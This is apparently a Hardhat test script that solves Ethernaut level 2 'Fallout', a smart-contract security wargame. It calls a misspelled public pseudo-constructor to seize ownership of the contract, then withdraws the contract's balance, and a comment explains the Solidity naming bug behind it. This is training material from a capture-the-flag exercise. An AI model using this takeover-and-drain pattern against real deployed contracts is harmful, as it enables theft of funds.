// # Ethernaut 2: Fallout

import {ethers} from 'hardhat'
import {Contract, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5'
const INSTANCE_ADDRESS = '0x3d3314199b979330Fce92AEE9fD3b81637E40cf8'

describe('02_Fallout_Solution', () => {
  let ethernaut: Contract
  let instance: Contract
  let signer: Signer
  let signerAddress: string

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Fallout', INSTANCE_ADDRESS)

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
  })

  // In pre-0.5.0 Solidity, a constructor used to be a function bearing the same
  // name as the contract (rather than being declared with the `constructor` keyword).
  // `Fallout` has a function called `Fal1out` which looks like a constructor but
  // isn't one, because there's a misspelling. It's a plain public function which
  // sets the owner to `msg.sender`.
  it('calls Fal1out with ether', async () => {
    const tx = await instance.Fal1out({gasLimit: 1000000})
    return expectStatusOK(tx)
  })

  it('has become owner', async () => {
    const ownerAddr = await instance.owner()
    expect(ownerAddr).to.equal(signerAddress)
  })

  it('withdraws the contract balance', async () => {
    const tx = await instance.collectAllocations()
    return expectStatusOK(tx)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
